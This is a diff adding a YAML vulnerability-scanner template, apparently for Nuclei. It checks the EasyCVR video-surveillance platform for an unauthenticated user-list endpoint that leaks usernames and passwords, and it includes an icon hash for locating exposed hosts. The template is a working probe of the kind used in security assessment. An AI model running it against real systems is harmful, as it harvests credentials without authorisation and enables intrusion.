@@ -1,0 +1,32 @@
+id: easycvr-userlist-info-disclosure
+
+info:
+  name: 视频监控汇聚平台 EasyCVR 用户信息泄漏
+  author: SleepingBag945
+  severity: high
+  description: |-
+    视频监控汇聚平台 EasyCVR 用户信息泄漏,可泄露账号密码
+    icon_hash="458134656"
+
+http:
+  - raw:
+      - |
+        GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"count":'
+          - '"data":'
+          - '"ID":'
+          - '"Name":'
+          - '"Username":'
+          - '"Password":'
+          - '"CreateAt":'
+        part: body
+        condition: and
